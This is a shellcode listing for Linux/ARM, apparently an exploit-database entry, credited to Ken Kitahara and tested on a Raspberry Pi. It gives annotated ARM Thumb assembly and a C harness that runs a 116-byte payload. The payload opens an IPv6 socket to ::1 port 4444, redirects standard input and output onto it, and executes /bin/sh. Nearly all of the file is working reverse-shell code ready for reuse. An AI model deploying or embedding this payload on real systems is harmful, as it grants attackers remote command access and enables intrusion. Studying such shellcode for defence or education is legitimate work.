/*
Title:  Linux/ARM - IPv6 ::1 4444/TCP Reverse Shellcode (116 Bytes)
Date:   2018-07-25
Tested: armv7l (Raspberry Pi 3 Model B+)
Author: Ken Kitahara

pi@raspberrypi:~ $ uname -a
Linux raspberrypi 4.14.34-v7+ #1110 SMP Mon Apr 16 15:18:51 BST 2018 armv7l GNU/Linux
pi@raspberrypi:~ $ lsb_release -a
No LSB modules are available.
Distributor ID:	Raspbian
Description:	Raspbian GNU/Linux 9.4 (stretch)
Release:	9.4
Codename:	stretch
pi@raspberrypi:~ $ cat reverseshell-ipv6.s
.section .text
.global _start

_start:
    .ARM
    add  r3, pc, #1
    bx   r3

    .THUMB
    // socket(AF_INET6, SOCK_STREAM, IPPROTO_IP)
    mov  r0, #10
    mov  r1, #1
    eor  r2, r2, r2
    mov  r7, #100
    add  r7, r7, #181
    svc  #1
    // save fd
    mov  r4, r0

    // connect(fd, &sockaddr, 28)
    adr  r1, struct_addr
    strb r2, [r1, #1]
    str  r2, [r1, #4]
    str  r2, [r1, #8]
    str  r2, [r1, #12]
    str  r2, [r1, #16]
    strh r2, [r1, #20]
    strb r2, [r1, #22]
    str  r2, [r1, #24]
    mov  r2, #28
    add  r7, r7, #2
    svc  #1

    // dup2(sockid, 0)
    mov  r0, r4
    eor  r1, r1, r1
    mov  r7, #63
    svc  #1

    // dup2(sockid, 1)
    mov  r0, r4
    add  r1, r1, #1
    svc  #1

    // dup2(sockid, 2)
    mov  r0, r4
    add  r1, r1, #1
    svc  #1

    // execve("/bin/sh", 0, 0)
    eor  r1, r1, r1
    eor  r2, r2, r2
    adr  r0, spawn
    strb r2, [r0, #7]
    mov  r7, #11
    svc  #1

    // adjust address
    eor  r7, r7, r7

spawn:
.ascii "/bin/shA"

struct_addr:
.ascii "\x0a\xff" // sin6_family -> AF_INET6
.ascii "\x11\x5c" // sin6_port -> 4444
.byte  1,1,1,1    // sin6_flowinfo -> NULL
.byte  1,1,1,1    // sin6_addr -> ::1
.byte  1,1,1,1
.byte  1,1,1,1
.byte  1,1,1,1
.byte  1,1,1,1    // sin6_scope_id -> NULL

pi@raspberrypi:~ $

*/

#include<stdio.h>
#include<string.h>

unsigned char sc[] = \
"\x01\x30\x8f\xe2\x13\xff\x2f\xe1"
"\x0a\x20\x01\x21\x52\x40\x64\x27"
"\xb5\x37\x01\xdf\x04\x1c\x10\xa1"
"\x4a\x70\x4a\x60\x8a\x60\xca\x60"
"\x0a\x61\x8a\x82\x8a\x75\x8a\x61"
"\x1c\x22\x02\x37\x01\xdf\x20\x1c"
"\x49\x40\x3f\x27\x01\xdf\x20\x1c"
"\x01\x31\x01\xdf\x20\x1c\x01\x31"
"\x01\xdf\x49\x40\x52\x40\x02\xa0"
"\xc2\x71\x0b\x27\x01\xdf\x7f\x40"
"\x2f\x62\x69\x6e\x2f\x73\x68\x41"
"\x0a\xff\x11\x5c\x01\x01\x01\x01"
"\x01\x01\x01\x01\x01\x01\x01\x01"
"\x01\x01\x01\x01\x01\x01\x01\x01"
"\x01\x01\x01\x01";

void main()
{
    printf("Shellcode Length: %d\n", strlen(sc));

    int (*ret)() = (int(*)())sc;

    ret();
}